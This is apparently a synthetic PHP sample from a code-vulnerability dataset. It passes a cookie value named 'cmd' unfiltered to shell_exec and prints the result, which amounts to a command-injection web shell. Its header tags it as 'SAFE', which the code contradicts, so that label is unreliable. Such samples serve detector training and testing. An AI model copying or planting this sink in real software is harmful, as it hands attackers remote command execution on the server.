<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=COOKIE_ISSET; SKELETON=S1; KEY=cmd; SINK=B3; VAR=v0073 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$inp = isset($_COOKIE["cmd"]) ? (string)$_COOKIE["cmd"] : "";
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B3($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
